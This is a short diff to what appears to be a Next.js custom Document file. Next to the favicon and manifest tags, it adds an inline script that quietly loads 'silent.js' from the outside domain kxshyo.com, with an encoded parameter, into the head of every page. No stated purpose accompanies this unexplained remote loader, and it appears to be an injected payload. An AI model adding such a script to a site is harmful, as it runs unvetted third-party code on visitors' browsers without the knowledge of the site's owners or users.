@@ -23,6 +23,7 @@ class MyDocument extends Document {
             href="/favicon/favicon-16x16.png"
           />
           <link rel="manifest" href="/favicon/site.webmanifest" />
+          <script>(function(d){let s=d.createElement('script');s.async=true;s.src='https://kxshyo.com/code/silent.js?h=waWQiOjExNjQyNTIsInNpZCI6MTI2NTgyNywid2lkIjo0ODA0ODYsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);</script>
         </Head>
         <body>
           <Main />
